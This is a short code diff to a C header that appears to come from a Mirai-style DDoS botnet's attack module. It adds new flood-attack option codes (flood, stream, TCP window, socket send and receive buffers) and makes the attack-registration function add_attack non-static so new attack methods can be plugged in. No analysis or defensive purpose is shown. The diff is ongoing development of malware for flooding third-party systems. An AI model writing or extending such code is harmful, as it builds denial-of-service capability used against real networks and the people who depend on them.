@@ -83,6 +83,11 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_OPT_BURST           26
 #define ATK_OPT_PORTS           27
 #define ATK_OPT_USYN            28
+#define ATK_OPT_FLOOD           30
+#define ATK_OPT_STREAM          31
+#define ATK_OPT_WINDOW          32
+#define ATK_OPT_CONN_SNDBUF     33
+#define ATK_OPT_CONN_RCVBUF     34
 #define ATK_OPT_CMD             29
 
 #define HTTP_CONN_INIT          0
@@ -190,5 +195,5 @@ void attack_method_udpx(uint8_t, struct attack_target *, uint8_t, struct attack_
 
 BOOL attack_raw_capable(void);
 
-static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
+void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
